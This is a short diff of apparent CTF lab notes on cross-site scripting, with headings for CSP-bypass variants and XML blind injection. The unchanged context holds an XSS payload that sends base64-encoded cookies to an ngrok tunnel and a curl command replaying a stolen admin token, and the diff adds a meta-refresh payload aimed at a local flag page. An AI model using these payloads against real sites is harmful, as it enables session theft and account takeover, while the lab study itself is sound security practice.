@@ -24,13 +24,13 @@ ngrok http 9000
 <script>document.write('<img src="http://340b-2406-3003-2077-4ea9-85b2-4692-1458-96f8.ngrok.io?cookie='+btoa(document.cookie)+'" />');</script>
 curl -H "Cookie: token=8abae5d8bc89622b6bf5a76c948312f2" http://127.0.0.1:5000/XSS/admin
 
-XSS with Content Security Policy
+XSS with Content Security Policy (Low)
 ---------
 <iframe src="http://localhost/CTF/attacker/base.html"></iframe>
 
-XSS
+XSS with Content-Security-Policy (High)
 -----------------
-
+<meta http-equiv="refresh" content="1; url=http://localhost:5000/XSS3/flag">
 
 
 XML Blind injection
